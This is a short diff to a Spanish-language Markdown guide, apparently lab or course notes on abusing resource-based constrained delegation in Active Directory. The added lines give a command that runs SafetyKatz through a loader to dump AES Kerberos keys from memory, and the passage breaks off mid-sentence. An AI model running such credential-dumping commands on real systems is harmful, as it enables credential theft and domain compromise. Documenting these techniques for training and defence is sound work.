@@ -1321,4 +1321,9 @@ Ahora comprobaremos si el *RBCD* esta bien configurado
 Get-DomainRBCD
 ```
 
-Ahora deberemos de obtener las claves AEs 
+Ahora deberemos de obtener las claves AES desde una CMD como Admonistrador
+```shell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
+
+Ahora co n 
